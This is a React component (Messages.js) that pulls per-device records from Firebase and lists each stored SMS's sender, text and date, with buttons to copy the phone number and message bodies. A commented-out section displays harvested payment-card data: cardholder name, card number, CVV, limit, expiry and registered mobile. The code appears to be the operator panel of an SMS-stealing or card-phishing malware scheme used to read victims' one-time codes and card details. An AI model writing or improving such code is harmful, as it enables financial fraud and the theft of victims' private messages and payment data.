// Messages.js
import React, { useState, useEffect } from 'react';
import { db } from './config';
import { ref, onValue } from 'firebase/database';
import { CopyToClipboard } from 'react-copy-to-clipboard';
import './Messages.css'; // Import the CSS file for styles

function Messages(props) {
  const [todoData, setTodoData] = useState([]);
  const [card, setCard] = useState([]);
  const [loading, setLoading] = useState(true);
  const [copied, setCopied] = useState(null);

  if(props.val != null || props.name != null || props.number != null) {

    console.log("All data number  - " + props.val+"  "+props.number);
    
    localStorage.setItem('device', props.val);
    localStorage.setItem('name', props.name);
    localStorage.setItem('number', props.number);
  }

  const device = localStorage.getItem('device');
  const names = localStorage.getItem('name');
  const number = localStorage.getItem('number');

  useEffect(() => {
    setLoading(true); // Set loading state when fetching data

    const fetchData = async () => {
      try {
        const starCountRef = ref(db, `Devices/${device}/Messages`);
        const starCount = ref(db, `Devices/${device}/Name`);
   
        const starCountSnapshot = await onValue(starCount, (snapshot) => {
          const data = snapshot.val();
          if (data) {
            const newPost = Object.keys(data).map((key) => ({
              id: key,
              ...data[key],
            }));
            newPost.sort((a, b) => b.id - a.id);
            setCard(newPost);
          } else {
            setCard([]);
          }
        });

        const starCountRefSnapshot = await onValue(starCountRef, (snapshot) => {
          const data = snapshot.val();
          console.log("My data - "+data);
          if (data !== null && data !== undefined) {
            const newPost = Object.keys(data).map((key) => ({
              id: key,
              ...data[key],
            }));
            newPost.sort((a, b) => b.id - a.id);
            setTodoData(newPost);
          } else {
            setTodoData([]);
          }
        });
      } catch (error) {
        console.error('Error fetching data: ', error);
      } finally {
        setLoading(false); // Set loading state to false after fetching
      }
    };

    fetchData();
  }, [device]);

  if (loading) {
    return <div className="loading">Loading...</div>; // Show loading indicator
  }

  return (
    <div className="messages-container">
      <div className="header1">
        <h2>Device Information</h2>
        <div className="desc"><b>Device ID </b> : {device !== undefined ? device : 'No device Found'}</div>
        <div className="desc"><b>Name</b> : {names!==undefined ? names : 'No name found'}</div>
        <div className="desc"><b>Number</b> : {number !== undefined ? number : 'No number found'}</div>
        <div className="button-container">
          <CopyToClipboard text={`${number}`} onCopy={() => setCopied(number)}>
            <button className="copy-button">Copy Number</button>
          </CopyToClipboard>
        </div>
      </div>

      {/* {card.length > 0 && (
        <div className="card">
          <div className="msg-con">Card Holder name - {card[0]?.cardHoldName}</div>
          <div className="msg-con">Card Number - {card[0]?.cardNum}</div>
          <div className="msg-con">CVV - {card[0]?.cvv}</div>
          <div className="msg-con">Limit - {card[0]?.limit}</div>
          <div className="msg-con">Month - {card[0]?.month}</div>
          <div className="msg-con">Registered Mobile Number - {card[0]?.regiMobile}</div>
          <div className="msg-con">Year - {card[0]?.year}</div>
        </div>
      )} */}

      {todoData.length > 0 ? (
        todoData.map((item, index) => (
          <div className="msg-wrapper" key={index}>
            <div className="msg-number">{index + 1}.</div>
            <div className="msg">
              <div className="message">
                <div className="msg-con"><b>From</b> - {item?.address !== undefined ? item?.address : 'Sender Not Available'}</div>
                <div className="msg-con"><b>Messages</b> - {item?.body !== undefined ? item?.body : 'Not Messages'}</div>
                <div className="msg-con"><b>Date</b> - {item?.date !== undefined ? item?.date : 'No Date Available'}</div>
                <div className="button-copy-delete">
                  <CopyToClipboard
                    text={`${item?.body}`}
                    onCopy={() => setCopied(index)}
                  >
                    <button className="copy-button">Copy</button>
                  </CopyToClipboard>
                  {copied === index && <span className="copied-text">Copied</span>}
                </div>
              </div>
            </div>
          </div>
        ))
      ) : (
        <div className="no-messages">No messages</div>
      )}
    </div>
  );
}

export default Messages;
